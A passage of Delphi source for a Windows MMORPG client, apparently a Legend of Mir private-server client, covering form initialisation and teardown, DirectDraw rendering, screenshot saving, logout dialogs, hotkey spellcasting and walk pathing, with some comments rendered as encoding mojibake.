    g_MagicList := TList.Create;
    g_FreeActorList := TList.Create;
    g_ShopTopList := TList.Create;
    g_ShopList1 := TList.Create;
    g_ShopList2 := TList.Create;
    g_ShopList3 := TList.Create;
    g_ShopList4 := TList.Create;
    g_ShopList5 := TList.Create;
    //DObjList := TList.Create;
    EventMan := TClEventManager.Create;
    g_ChangeFaceReadyList := TList.Create;
    g_ServerList := TStringList.Create;
    g_MySelf := Nil;
    g_HeronRecogId := 0;
    g_HeroMagicList := TList.Create;
    FillChar(g_HeroUseItems, sizeof(TClientItem) * 14, #0);
    FillChar(g_HeroItemArr, sizeof(TClientItem) * MAXBAGITEMCL, #0);

    FillChar(g_UseItems, sizeof(TClientItem) * 14, #0);
    FillChar(g_ItemArr, sizeof(TClientItem) * MAXBAGITEMCL, #0);
    FillChar(g_DealItems, sizeof(TClientItem) * 10, #0);
    FillChar(g_OpenBoxItem, sizeof(g_OpenBoxItem), #0);
    FillChar(g_DealRemoteItems, sizeof(TClientItem) * 20, #0);
    FillChar(g_LevelItemArr, SizeOf(TClientItem) * 3, #0);
    FillChar(g_TaxisSelf, SizeOf(TTaxisSelf) * 10, #0);
    FillChar(g_TaxisHero, SizeOf(TTaxisHero) * 10, #0);
    FillChar(g_ShopItems, Sizeof(TShopItem) * 20, #0);
    FillChar(g_ShopItems2, Sizeof(TShopItem) * 20, #0);
    FillChar(g_SellList, SizeOf(TClientPlacing) * 10, #0);
    FillChar(g_WineItem, Sizeof(TClientItem) * 7, #0);
    FillChar(g_WineItem1, Sizeof(TClientItem) * 3, #0);
    //g_ClearWg:=Server.DecryptStr(g_ClearWg);
    //g_ClearWg2:=Server.DecryptStr(g_ClearWg2);
    //FillChar (g_BonusAbilChg, sizeof(TNakedAbility), #0);

    g_SaveItemList := TList.Create;
    g_MenuItemList := TList.Create;
    g_WaitingUseItem.Item.S.Name := '';
    //馒侩芒 辑滚客 烹脚埃俊 烙矫历厘
    g_EatingItem.S.Name := '';
    g_SelfShopItem.S.Name := '';

    g_nTargetX := -1;
    g_nTargetY := -1;
    g_TargetCret := Nil;
    g_FocusCret := Nil;
    g_FocusItem := Nil;
    g_MagicTarget := Nil;
    g_nDebugCount := 0;
    g_nDebugCount1 := 0;
    g_nDebugCount2 := 0;
    g_nTestSendCount := 0;
    g_nTestReceiveCount := 0;
    g_boServerChanging := FALSE;
    g_boBagLoaded := FALSE;
    g_boAutoDig := FALSE;

    g_dwLatestClientTime2 := 0;
    g_dwFirstClientTime := 0;
    g_dwFirstServerTime := 0;
    g_dwFirstClientTimerTime := 0;
    g_dwLatestClientTimerTime := 0;
    g_dwFirstClientGetTime := 0;
    g_dwLatestClientGetTime := 0;

    g_nTimeFakeDetectCount := 0;
    g_nTimeFakeDetectTimer := 0;
    g_nTimeFakeDetectSum := 0;

    g_dwSHGetTime := GetTickCount();
    g_dwSHTimerTime := 0;
    g_nSHFakeCount := 0;

    g_nDayBright := 3; //广
    g_nAreaStateValue := 0;
    g_ConnectionStep := cnsLogin;
    g_boSendLogin := False;
    g_boWgClose:=False;
    g_boServerConnected := FALSE;
    SocStr := '';
    WarningLevel := 0;
    //阂樊菩哦 荐脚 冉荐 (菩哦汗荤 啊瓷己 乐澜)
    ActionFailLock := FALSE;
    g_boMapMoving := FALSE;
    g_boMapMovingWait := FALSE;
    g_boCheckBadMapMode := FALSE;
    g_boCheckSpeedHackDisplay := FALSE;
    g_boViewMiniMap := FALSE;
    g_boShowGreenHint := FALSE;
    g_boShowWhiteHint := FALSE;
    FailDir := 0;
    FailAction := 0;
    g_nDupSelection := 0;

    g_dwLastAttackTick := GetTickCount;
    g_dwLastMoveTick := GetTickCount;
    g_dwLatestSpellTick := GetTickCount;

    g_dwAutoPickupTick := GetTickCount;
    g_boFirstTime := TRUE;
    g_boItemMoving := FALSE;
    g_boDoFadeIn := FALSE;
    g_boDoFadeOut := FALSE;
    g_boDoFastFadeOut := FALSE;
    g_boAttackSlow := FALSE;
    g_boMoveSlow := FALSE;
    g_boNextTimePowerHit := FALSE;
    g_boCanLongHit := FALSE;
    g_boCanWideHit := FALSE;
    g_boCanCrsHit := False;
    //   g_boCanTwnHit   := False;

    g_boNextTimeFireHit := FALSE;
    g_boNextTimeLongFireHit := False;

    g_boNoDarkness := FALSE;
    g_SoftClosed := FALSE;
    g_boQueryPrice := FALSE;
    g_sSellPriceStr := '';

    g_boAllowGroup := FALSE;
    g_GroupMembers := TStringList.Create;

    MainWinHandle := DxDraw.Handle;

    //盔努腐, 内齿岿靛 殿..
    BoOneClick := False;
    OneClickMode := toNone;

    g_boSound := True;
    g_boBGSound := True;

    //CSocket.Address:=g_sServerAddr;
    If g_sServerAddr <> '' Then
    Begin
      CSocket.Host := g_sServerAddr;
      CSocket.Port := g_nServerPort;
    End;
    Client.CommonalityKey := Server.DecryptStr(RSA_LOGIN_KEY);
    Client.CommonalityMode := Server.DecryptStr(RSA_LOGIN_MODE);
    //   m_boLogin:=False;
    //   m_boEnd:=False;
       //CSocket.Active:=True;
    //{$IF SOFTNEWVER  <> VERBLUEYUE}
    //   Timer2.Enabled:=True;
    //{$ELSE}
    CSocket.Active := True;
    //{$IFEND}

       //MainSurface := nil;
    DebugOutStr('----------------------- started ------------------------');

    Application.OnException := OnProgramException;
    Application.OnIdle := AppOnIdle;
{$IF TOOLVER     = MONEYVER}
    QueryPerformanceFrequency(Frequency);
    QueryPerformanceCounter(OldCounter);
    TimerID := timeSetEvent(1000, 0, TimeProc, 1, 1);
{$IFEND}
    //if FileSize(application.ExeName) > (500*1024) then g_boFlag:=True;

  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.FormCreate'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.OnProgramException(Sender: TObject; E: Exception);
Begin
  Try //程序自动增加
    DebugOutStr(E.Message);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.OnProgramException'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.WMMove(Var Message: TWMMove);
Begin
  m_Point := DxDraw.ClientOrigin;
End;

Procedure TfrmMain.WMSysCommand(Var Message: TWMSysCommand);
Begin
  Try //程序自动增加
    {   with Message do begin
          if (CmdType and $FFF0) = SC_KEYMENU then begin
             if (Key = VK_TAB) or (Key = VK_RETURN) then begin
                FrmMain.WindowState := wsMinimized;
             end else
                inherited;
          end else
             inherited;
       end;
    }
    Inherited;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.WMSysCommand'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.FormDestroy(Sender: TObject);
Var
  I: Integer;
Begin
  Try //程序自动增加
    // ClearShowItemList();
     //g_ShowItemList.Free;
     //g_ShowItemList:=nil;
    g_WgHintList.Free;
    g_AutoPickupList.Free;
    g_AutoPickupList := Nil;
    If g_ToolMenuHook <> 0 Then
      UnhookWindowsHookEx(g_ToolMenuHook);
    //SoundCloseProc;
    //DXTimer.Enabled := FALSE;
    Timer1.Enabled := FALSE;
    MinTimer.Enabled := FALSE;

    UnLoadWMImagesLib();
    //   WTiles.Finalize;
       {
       WObjects1.Finalize;
       WObjects2.Finalize;
       WObjects3.Finalize;
       WObjects4.Finalize;
       WObjects5.Finalize;
       WObjects6.Finalize;
       WObjects7.Finalize;
       WObjects8.Finalize;
       WObjects9.Finalize;
       WObjects10.Finalize;
       }
    //   WHumWing.Finalize;
    //   WDragonImg.Finalize;
    //   WSmTiles.Finalize;
    //   WHumImg.Finalize;
    //   WHairImg.Finalize;
    //   WWeapon.Finalize;
    //   WMagic.Finalize;
    //   WMagic2.Finalize;
    //   WMagIcon.Finalize;
       {WMonImg.Finalize;
       WMon2Img.Finalize;
       WMon3Img.Finalize;
       WMon4Img.Finalize;
       WMon5Img.Finalize;
       WMon6Img.Finalize;
       WMon7Img.Finalize;
       WMon8Img.Finalize;
       WMon9Img.Finalize;
       WMon10Img.Finalize;
       WMon11Img.Finalize;
       WMon12Img.Finalize;
       WMon13Img.Finalize;
       WMon14Img.Finalize;
       WMon15Img.Finalize;
       WMon16Img.Finalize;
       WMon17Img.Finalize;
       WMon18Img.Finalize;
       WMon19Img.Finalize;
       WMon20Img.Finalize;
       WMon21Img.Finalize;
       WMon50Img.Finalize;
       WMon51Img.Finalize;
       WMon52Img.Finalize;
       WMon53Img.Finalize;
       WMon54Img.Finalize; }

    //   WNpcImg.Finalize;
    //   WEffectImg.Finalize;
    //   WChrSel.Finalize;
    //   WMMap.Finalize;
    //   WBagItem.Finalize;
    //   WStateItem.Finalize;
    //   WDnItem.Finalize;

    For I := 0 To NpcImageList.Count - 1 Do
    Begin
      TWMImages(NpcImageList.Items[I]).Finalize;
    End;
    For I := 0 To ItemImageList.Count - 1 Do
    Begin
      TWMImages(ItemImageList.Items[I]).Finalize;
    End;
    For I := 0 To MMapImageList.Count - 1 Do
    Begin
      TWMImages(MMapImageList.Items[I]).Finalize;
    End;
    For I := 0 To DnItemImageList.Count - 1 Do
    Begin
      TWMImages(DnItemImageList.Items[I]).Finalize;
    End;
    For I := 0 To BagItemImageList.Count - 1 Do
    Begin
      TWMImages(BagItemImageList.Items[I]).Finalize;
    End;
    For I := 0 To WeaponImageList.Count - 1 Do
    Begin
      TWMImages(WeaponImageList.Items[I]).Finalize;
    End;
    For I := 0 To HumImageList.Count - 1 Do
    Begin
      TWMImages(HumImageList.Items[I]).Finalize;
    End;

    DScreen.Finalize;
    PlayScene.Finalize;
    LoginNoticeScene.Finalize;

    DScreen.Free;
    IntroScene.Free;
    LoginScene.Free;
    SelectChrScene.Free;
    PlayScene.Free;
    LoginNoticeScene.Free;
    g_SaveItemList.Free;
    g_MenuItemList.Free;

    DebugOutStr('----------------------- closed -------------------------');
    Map.Free;
    g_DropedItemList.Free;
    g_MagicList.Free;
    g_FreeActorList.Free;
    g_ChangeFaceReadyList.Free;

    g_ServerList.Free;
    //if MainSurface <> nil then MainSurface.Free;

    g_Sound.Free;
    g_SoundList.Free;
    //   BGMusicList.Free;
       //DObjList.Free;
    EventMan.Free;
    NpcImageList.Free;
    ItemImageList.Free;
    MMapImageList.Free;
    DnItemImageList.Free;
    BagItemImageList.Free;
    WeaponImageList.Free;
    HumImageList.Free;

    g_DXSound.Free;
    g_DWinMan.Free;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.FormDestroy'); //程序自动增加
  End; //程序自动增加
End;

Function ComposeColor(Dest, Src: TRGBQuad; Percent: Integer): TRGBQuad;
Begin
  Try //程序自动增加
    With Result Do
    Begin
      rgbRed := Src.rgbRed + ((Dest.rgbRed - Src.rgbRed) * Percent Div 256);
      rgbGreen := Src.rgbGreen + ((Dest.rgbGreen - Src.rgbGreen) * Percent Div
        256);
      rgbBlue := Src.rgbBlue + ((Dest.rgbBlue - Src.rgbBlue) * Percent Div 256);
      rgbReserved := 0;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] UnClMain.ComposeColor'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.DXDrawInitialize(Sender: TObject);
Var
  d: TDirectDrawSurface;
  i: integer;
Begin
  Try //程序自动增加

    If g_boFirstTime Then
    Begin
      g_boFirstTime := FALSE;
      DxDraw.SurfaceWidth := SCREENWIDTH;
      DxDraw.SurfaceHeight := SCREENHEIGHT;

{$IF USECURSOR = DEFAULTCURSOR}
      DxDraw.Cursor := crHourGlass;
{$ELSE}
      DxDraw.Cursor := crNone;
{$IFEND}
      //Dxdraw.Initialize;
      DxDraw.Surface.Canvas.Font.Assign(FrmMain.Font);
      //DxDraw.Surface.BitCount
      FrmMain.Font.Name := g_sCurFontName;
      FrmMain.Canvas.Font.Name := g_sCurFontName;
      DxDraw.Surface.Canvas.Font.Name := g_sCurFontName;
      PlayScene.EdChat.Font.Name := g_sCurFontName;

      //MainSurface := TDirectDrawSurface.Create (frmMain.DxDraw.DDraw);
      //MainSurface.SystemMemory := TRUE;
      //MainSurface.SetSize (SCREENWIDTH, SCREENHEIGHT);
      DefDsurface := DXDraw.Surface;
      InitWMImagesLib(DxDraw);

      DxDraw.DefColorTable := g_WMainImages.MainPalette;
      DxDraw.ColorTable := DxDraw.DefColorTable;
      DxDraw.UpdatePalette;
      DIB_ColorTable := DxDraw.DefColorTable;

      //256 Blend utility
      DxDraw.Surface.Fill(0);
{$IF SOFTADOPEN  = ADOPEN}
      d := g_UIBImages.Images[26];
      If d <> Nil Then
        DxDraw.Surface.Draw((SCREENWIDTH Div 2) - (d.Width Div 2),
          (SCREENHEIGHT Div 2) - (d.Height Div 2),
          d.ClientRect,
          d,
          TRUE);

      //DxDraw.Primary.Draw (0, 0, DxDraw.Surface.ClientRect, DxDraw.Surface, False);
      //DxDraw.Primary.Draw (0, 0, d.ClientRect,d, FALSE);
{$IFEND}
      DxDraw.Flip;

      {FillChar(DIB_LowColorTable,SizeOf(DIB_LowColorTable),0);
      For I:=Low(DIB_ColorTable) to High(DIB_ColorTable) do
        DIB_LowColorTable[DIB_ColorTable[I].rgbRed,DIB_ColorTable[I].rgbGreen,DIB_ColorTable[I].rgbBlue]:=I;

       }
      If Not LoadNearestIndex(NEARESTPALETTEINDEXFILE) Then
      Begin
        BuildNearestIndex(DxDraw.ColorTable);
        SaveNearestIndex(NEARESTPALETTEINDEXFILE);
      End;
      BuildColorLevels(DxDraw.ColorTable);

      DScreen.Initialize;
      PlayScene.Initialize;
      FrmDlg.Initialize;

      {FillChar(ItdllByte1,SizeOf(ItdllByte1),0);
      FillChar(ItdllByte2,SizeOf(ItdllByte2),0);
      FillChar(ItdllByte3,SizeOf(ItdllByte3),0);
      FillChar(ItdllByte4,SizeOf(ItdllByte4),0);
      FillChar(ItdllByte5,SizeOf(ItdllByte5),0);
      FillChar(ItdllByte6,SizeOf(ItdllByte6),0);
      FillChar(ItdllByte7,SizeOf(ItdllByte7),0);  }

      {if doFullScreen in DxDraw.Options then begin
         //Screen.Cursor := crNone;
      end else begin
         Left := 0;
         Top := 0;
         Width := SCREENWIDTH;
         Height := SCREENHEIGHT;
         g_boNoDarkness := TRUE;
         //g_boUseDIBSurface := TRUE;
         //frmMain.BorderStyle := bsSingle;
      end;    }

      g_ImgMixSurface := TDirectDrawSurface.Create(frmMain.DxDraw.DDraw);
      g_ImgMixSurface.SystemMemory := TRUE;
      g_ImgMixSurface.SetSize(800, 600);
      g_MiniMapSurface := TDirectDrawSurface.Create(frmMain.DxDraw.DDraw);
      g_MiniMapSurface.SystemMemory := TRUE;
      g_MiniMapSurface.SetSize(540, 360);
      //DxDraw.Surface.SystemMemory := TRUE;

    End;
    //DxDraw.SetSize(800,600);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.DXDrawInitialize'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.DXDrawFinalize(Sender: TObject);
Begin
  Try //程序自动增加
    //DXTimer.Enabled := FALSE;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.DXDrawFinalize'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.FormClose(Sender: TObject; Var Action: TCloseAction);
Begin
  Try //程序自动增加
    //Savebags ('.\Data\' + ServerName + '.' + CharName + '.itm', @ItemArr);
    //DxTimer.Enabled := FALSE;
 //   m_TitleList.Free;
 //   m_ProcessList.Free;
{$IF TOOLVER     = MONEYVER}
    timeKillEvent(TimerID);
{$IFEND}
    If g_MySelf <> Nil Then
      SaveUserConfig(CharName);
    If g_CloseWeb <> '' Then
      ShellExecute(Handle,
        'Open',
        PChar('IEXPLORE.EXE'),
        PChar(g_CloseWeb),
        '',
        SW_SHOWNORMAL);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.FormClose'); //程序自动增加
  End; //程序自动增加
End;

{------------------------------------------------------------}

Procedure TfrmMain.ProcOnIdle;
Var
  done: Boolean;
Begin
  Try //程序自动增加
    AppOnIdle(self, done);
    //DXTimerTimer (self, 0);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ProcOnIdle'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.AppOnIdle(Sender: TObject; Var Done: Boolean);
//procedure TFrmMain.DXTimerTimer(Sender: TObject; LagCount: Integer);
Resourcestring
  Logo1 = '健康游戏公告';
  Logo2 =
    '抵制不良游戏，拒绝盗版游戏。注意自我保护，谨防受骗上当。适度游戏益脑，';
  Logo3 =
    '沉迷游戏伤身。合理安排时间，享受健康生活。严厉打击赌博，营造和谐环境。';
Var
  //   i, j: integer;
  p, T: TPoint;
  //   DF: DDBLTFX;
  d: TDirectDrawSurface;
  //   nC:integer;
  //   Rect: TRect;
  //   sMsg:String;
Begin
  Try //程序自动增加

    Done := TRUE;
    If Not DxDraw.CanDraw Then
      exit;
    //
    //m_nClientRunTime:=GetTickCount;
    Sleep(10);
    ProcessKeyMessages;
    ProcessActionMessages;
    DScreen.DrawScreen(DxDraw.Surface);
    g_DWinMan.DirectPaint(DxDraw.Surface);
    DScreen.DrawScreenTop(DxDraw.Surface);
    DScreen.DrawHint(DxDraw.Surface);
    //exit;
{$IF USECURSOR = IMAGECURSOR}
    {Draw cursor}
    //=========================================
    //显示光标
    CursorSurface := g_WMainImages.Images[0];
    If CursorSurface <> Nil Then
    Begin
      GetCursorPos(p);
      DxDraw.Surface.Draw(p.x, p.y, CursorSurface.ClientRect, CursorSurface,
        TRUE);
    End;
    //==========================
{$IFEND}

    If g_boItemMoving Then
    Begin
      If (g_MovingItem.Item.S.Name <> g_sGoldName {'金币'}) Then
        //d := g_WBagItemImages.Images[g_MovingItem.Item.S.Looks]
        d := GetWBagItemImg(g_MovingItem.Item.S.Looks)
      Else
        d := GetWBagItemImg(115);
      //d := g_WBagItemImages.Images[115]; //金币外形
      If d <> Nil Then
      Begin
        GetCursorPos(p);
        If g_boUseDIBSurface Then
        Begin
          p.X := p.X - m_Point.X;
          p.Y := p.Y - m_Point.Y;
        End;
        DxDraw.Surface.Draw(p.x - (d.ClientRect.Right Div 2),
          p.y - (d.ClientRect.Bottom Div 2),
          d.ClientRect,
          d,
          TRUE);
        //显示物品的ID号
        If (g_MovingItem.Item.S.Name <> g_sGoldName {'金币'}) and g_BagShowItemDec Then
          With DxDraw.Surface.Canvas Do
          Begin
            SetBkMode(Handle, TRANSPARENT);
            Font.Color := clYellow;
            TextOut(p.X + 9, p.Y + 3, g_MovingItem.Item.S.Name + Format('(%d)',
              [g_MovingItem.Item.MakeIndex]));
            Release;
          End;
      End;
    End;
    If g_boDoFadeOut Then
    Begin
      If g_nFadeIndex < 1 Then
        g_nFadeIndex := 1;
      //MakeDark (DxDraw.Surface, g_nFadeIndex);
      If g_nFadeIndex <= 1 Then
        g_boDoFadeOut := FALSE
      Else
        Dec(g_nFadeIndex, 2);
    End
    Else If g_boDoFadeIn Then
    Begin
      If g_nFadeIndex > 29 Then
        g_nFadeIndex := 29;
      //MakeDark (DxDraw.Surface, g_nFadeIndex);
      If g_nFadeIndex >= 29 Then
        g_boDoFadeIn := FALSE
      Else
        Inc(g_nFadeIndex, 2);
    End
    Else If g_boDoFastFadeOut Then
    Begin
      If g_nFadeIndex < 1 Then
        g_nFadeIndex := 1;
      //MakeDark (DxDraw.Surface, g_nFadeIndex);
      If g_nFadeIndex > 1 Then
        Dec(g_nFadeIndex, 4);
    End;

    If g_ConnectionStep = cnsLogin Then
    Begin

      With DxDraw.Surface.Canvas Do
      Begin

        SetBkMode(Handle, TRANSPARENT);
        Font.Color := clLime;

        TextOut(SCREENWIDTH - TextWidth(VERSION_NUMBER_STR) - 5, SCREENHEIGHT -
          TextHeight('W') - 5, VERSION_NUMBER_STR);

        Font.Color := GetRGB(255) {clYellow};
        TextOut((SCREENWIDTH Div 2) - (TextWidth(Logo1) Div 2), SCREENHEIGHT -
          65, Logo1);
        TextOut((SCREENWIDTH Div 2) - (TextWidth(Logo2) Div 2), SCREENHEIGHT -
          45, Logo2);
        TextOut((SCREENWIDTH Div 2) - (TextWidth(Logo3) Div 2), SCREENHEIGHT -
          25, Logo3);
        Release;
      End;
    End;
    //DxDraw.Flip;
    //self.m_Point.X
    DxDraw.Primary.Draw(m_Point.X, m_Point.Y, DxDraw.Surface.ClientRect,
      DxDraw.Surface, FALSE);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.AppOnIdle'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.AppLogout;
Begin
  Try //程序自动增加
    If mrOk = FrmDlg.DMessageDlg('你想退出到选择角色界面吗？',
      [mbOk, mbCancel]) Then
    Begin
      SendClientMessage(CM_SOFTCLOSE, 0, 0, 0, 0);
      SaveUserConfig(CharName);
      if g_LegendMap<>nil  then FreeAndNil(g_LegendMap);
      g_nMiniMapPath := nil;
      PlayScene.ClearActors;
      CloseAllWindows;
      If Not BoOneClick Then
      Begin
        //         PlayScene.MemoLog.Lines.Add('小退关闭');
        g_SoftClosed := TRUE;
        ActiveCmdTimer(tcSoftClose);
      End
      Else
      Begin
        ActiveCmdTimer(tcReSelConnect);
      End;
      { if g_boBagLoaded then
          Savebags ('.\Data\' + g_sServerName + '.' + CharName + '.itm', @g_ItemArr);
       g_boBagLoaded := FALSE;  }
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.AppLogout'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.AppExit;
Begin
  Try //程序自动增加
    If mrOk = FrmDlg.DMessageDlg('你想退出传奇吗?', [mbOk, mbCancel])
      Then
    Begin
      SaveUserConfig(CharName);
      //CloseAllWindows;
      {if g_boBagLoaded then
         Savebags ('.\Data\' + g_sServerName + '.' + CharName + '.itm', @g_ItemArr);
      g_boBagLoaded := FALSE;}
      FrmMain.Close;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.AppExit'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.PrintScreenNow;
  Function IntToStr2(n: integer): String;
  Begin
    If n < 10 Then
      Result := '0' + IntToStr(n)
    Else
      Result := IntToStr(n);
  End;
Var
  i, k, ii, n, checksum: integer;
  flname: String;
  dib: TDIB;
  ddsd: TDDSurfaceDesc;
  sptr, dptr: PByte;
  sptr2, dptr2: PDWORD;
Begin
  Try //程序自动增加
    If Not DxDraw.CanDraw Then
      exit;
    While TRUE Do
    Begin
      flname := 'Images' + IntToStr2(g_nCaptureSerial) + '.bmp';
      If Not FileExists(flname) Then
        break;
      Inc(g_nCaptureSerial);
    End;
    dib := TDIB.Create;
    If g_boUseDIBSurface Then
    Begin
      dib.BitCount := 32;
      dib.Width := SCREENWIDTH;
      dib.Height := SCREENHEIGHT;

    End
    Else
    Begin
      dib.BitCount := 8;
      dib.Width := SCREENWIDTH;
      dib.Height := SCREENHEIGHT;
      dib.ColorTable := g_WMainImages.MainPalette;
      dib.UpdatePalette;
    End;

    ddsd.dwSize := SizeOf(ddsd);
    checksum := 0;
    Try
      DxDraw.Surface.Lock(TRect(Nil^), ddsd);
      For i := (600 - 120) To SCREENHEIGHT - 10 Do
      Begin
        sptr := PBYTE(integer(ddsd.lpSurface) + (SCREENHEIGHT - 1 - i) *
          ddsd.lPitch + 200);
        For k := 0 To 400 - 1 Do
        Begin
          checksum := checksum + byte(pbyte(integer(sptr) + k)^);
        End;
      End;
    Finally
      DxDraw.Surface.Unlock();
    End;

    Try
      SetBkMode(DxDraw.Surface.Canvas.Handle, TRANSPARENT);
      DxDraw.Surface.Canvas.Font.Color := clWhite;
      n := 0;
      If g_MySelf <> Nil Then
      Begin
        //DxDraw.Surface.Canvas.TextOut(0, 0, g_sServerName + ' ' + g_MySelf.m_sUserName);
        DxDraw.Surface.Canvas.TextOut(1, 0, g_sServerName + ' ' +
          g_MySelf.m_sUserName);
        Inc(n, 1);
      End;
      DxDraw.Surface.Canvas.TextOut(1, (n) * 12, 'CheckSum=' +
        IntToStr(checksum));
      DxDraw.Surface.Canvas.TextOut(1, (n + 1) * 12, DateToStr(Date));
      DxDraw.Surface.Canvas.TextOut(1, (n + 2) * 12, TimeToStr(Time));
      DxDraw.Surface.Canvas.Release;
      //DxDraw.Primary.Lock (TRect(nil^), ddsd);
      DxDraw.Flip;
      DxDraw.Surface.Lock(TRect(Nil^), ddsd);
      If g_boUseDIBSurface Then
      Begin
        For i := 0 To dib.Height - 1 Do
        Begin
          sptr2 := PDWORD(integer(ddsd.lpSurface) + (dib.Height - 1 - i) *
            ddsd.lPitch);
          For ii := 0 To dib.Width - 1 Do
          Begin
            dib.Pixels[ii, (dib.Height - 1 - i)] := sptr2^;
            inc(sptr2);
          End;
        End;
      End
      Else
      Begin
        For i := 0 To dib.Height - 1 Do
        Begin
          sptr := PBYTE(integer(ddsd.lpSurface) + (dib.Height - 1 - i) *
            ddsd.lPitch);
          dptr := PBYTE(integer(dib.PBits) + i * SCREENWIDTH);
          Move(sptr^, dptr^, SCREENWIDTH);
        End;
      End;
    Finally
      DxDraw.Surface.UnLock;
    End;
    dib.SaveToFile(flname);
    dib.Clear;
    dib.Free;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.PrintScreenNow'); //程序自动增加
  End; //程序自动增加
End;

{------------------------------------------------------------}

Procedure TfrmMain.ProcessKeyMessages;
Begin
  Try //程序自动增加
    {
    case ActionKey of
       VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8:
          begin
             UseMagic (MouseX, MouseY, GetMagicByKey (char ((ActionKey-VK_F1) + byte('1')) )); //胶农赴 谅钎
             //DScreen.AddSysMsg ('KEY' + IntToStr(Random(10000)));
             ActionKey := 0;
             TargetX := -1;
             exit;
          end;
    end;
    }
    Case ActionKey Of
      VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8:
        Begin
          UseMagic(g_nMouseX, g_nMouseY, GetMagicByKey(char((ActionKey - VK_F1)
            + byte('1')))); //胶农赴 谅钎
          ActionKey := 0;
          g_nTargetX := -1;
          exit;
        End;
      12..19:
        Begin
          UseMagic(g_nMouseX, g_nMouseY, GetMagicByKey(char((ActionKey - 12) +
            byte('1') + byte($14))));
          ActionKey := 0;
          g_nTargetX := -1;
          exit;
        End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ProcessKeyMessages'); //程序自动增加
  End; //程序自动增加
End;

{
 鼠标控制 左　键 控制基本的行动：行走、攻击拾取物品和其他东西
右　键 近处的点击能够看到物品使用方法，远处的点击能够在地图上跑动。
Shift + 左键 强制攻击
Ctrl + 左键 跑动
Ctrl + 右键 关于对手的信息，如同F10一样。
Alt + 右键 取得肉或者其他玩家因为死亡丢失的东西。
双　击 拾取在地上的物品或者使用自己包裹中的物品。
}

Procedure TfrmMain.ProcessActionMessages;
Var
  mx, my, dx, dy, crun: integer;
  ndir, adir, mdir: byte;
  bowalk, bostop: Boolean;
Label
  LB_WALK, TTTT;
Begin
  Try //程序自动增加
    If g_MySelf = Nil Then
      exit;

   //自动移动
  if g_boAutoMoveing then GetAutoMovingXY();

    //Move
    If (g_nTargetX >= 0) And CanNextAction And ServerAcceptNextAction Then
    Begin //ActionLock捞 钱府搁, ActionLock篮 悼累捞 场唱扁 傈俊 钱赴促.
      If (g_nTargetX <> g_MySelf.m_nCurrX) Or (g_nTargetY <> g_MySelf.m_nCurrY)
        Then
      Begin
        TTTT:
        mx := g_MySelf.m_nCurrX;
        my := g_MySelf.m_nCurrY;
        dx := g_nTargetX;
        dy := g_nTargetY;
        ndir := GetNextDirection(mx, my, dx, dy);
        Case g_ChrAction Of
          caWalk:
            Begin
              LB_WALK:
              //Jacky 打开

              {DScreen.AddSysMsg ('caWalk ' + IntToStr(g_Myself.m_nCurrX) + ' ' +
                                             IntToStr(g_Myself.m_nCurrY) + ' ' +
                                             IntToStr(g_nTargetX) + ' ' +
                                             IntToStr(g_nTargetY));  }

              crun := g_MySelf.CanWalk;
              If IsUnLockAction(CM_WALK, ndir) And (crun > 0) Then
              Begin
                GetNextPosXY(ndir, mx, my);
                //bowalk := TRUE;
                bostop := FALSE;
                If Not PlayScene.CanWalk(mx, my) Then
                Begin
                  bowalk := FALSE;
                  adir := 0;
                  If Not bowalk Then
                  Begin //涝备 八荤
                    mx := g_MySelf.m_nCurrX;
                    my := g_MySelf.m_nCurrY;
                    GetNextPosXY(ndir, mx, my);
                    If CheckDoorAction(mx, my) Then
                      bostop := TRUE;
                  End;
                  If Not bostop And Not PlayScene.CrashMan(mx, my) Then
                  Begin
                    mx := g_MySelf.m_nCurrX;
                    my := g_MySelf.m_nCurrY;
                    adir := PrivDir(ndir);
                    GetNextPosXY(adir, mx, my);
                    If Not Map.CanMove(mx, my) Then
                    Begin
                      mx := g_MySelf.m_nCurrX;
                      my := g_MySelf.m_nCurrY;
                      adir := NextDir(ndir);
                      GetNextPosXY(adir, mx, my);
                      If Map.CanMove(mx, my) Then
                        bowalk := TRUE;
                    End
                    Else
                      bowalk := TRUE;
                  End;
                  If bowalk Then
                  Begin
                    g_MySelf.UpdateMsg(CM_WALK, mx, my, adir, 0, 0, '', 0);
                    g_dwLastMoveTick := GetTickCount;
                  End
                  Else
                  Begin
                    mdir := GetNextDirection(g_MySelf.m_nCurrX,
                      g_MySelf.m_nCurrY, dx, dy);
                    If mdir <> g_MySelf.m_btDir Then
                      g_MySelf.SendMsg(CM_TURN, g_MySelf.m_nCurrX,
                        g_MySelf.m_nCurrY, mdir, 0, 0, '', 0);
                    g_nTargetX := -1;
                  End;
                End
                Else
                Begin
                  g_MySelf.UpdateMsg(CM_WALK, mx, my, ndir, 0, 0, '', 0);
                  //亲惑 付瘤阜 疙飞父 扁撅
                  g_dwLastMoveTick := GetTickCount;
                End;
              End
              Else
              Begin
                g_nTargetX := -1;
              End;
            End;
          caRun:
            Begin
              //免助跑
